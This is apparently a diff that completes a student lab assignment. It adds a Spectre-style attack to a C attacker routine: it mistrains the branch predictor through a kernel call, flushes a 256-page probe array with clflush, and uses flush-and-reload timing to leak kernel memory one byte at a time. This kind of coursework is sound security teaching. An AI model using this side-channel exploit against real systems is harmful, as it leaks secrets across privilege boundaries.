@@ -12,6 +12,9 @@
 #include "lab2.h"
 #include "lab2ipc.h"
 
+#define NUM_BLOCKS 256
+#define ITERATIONS 1
+#define TRAIN_ITERS 10
 /*
  * call_kernel_part2
  * Performs the COMMAND_PART2 call in the kernel
@@ -49,6 +52,27 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // [Part 2]- Fill this in!
         // leaked_byte = ??
 
+	//mistrain the predictor
+	int itr = 0;
+	while(itr<ITERATIONS) {
+		for(int i = 0; i < TRAIN_ITERS; i++) {
+			call_kernel_part2(kernel_fd, shared_memory, 0);
+		}
+
+		for(int block = 0; block < NUM_BLOCKS; block++) {
+			clflush(shared_memory + 4096*block);
+		}	
+
+		call_kernel_part2(kernel_fd, shared_memory, current_offset);
+
+		for(int block = 0; block < NUM_BLOCKS; block++) {
+			int time_required = time_access(shared_memory + 4096*block);
+			if(time_required < 150) {
+				leaked_byte = (char) block;
+				itr++;
+			}
+		}
+	}
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
             break;
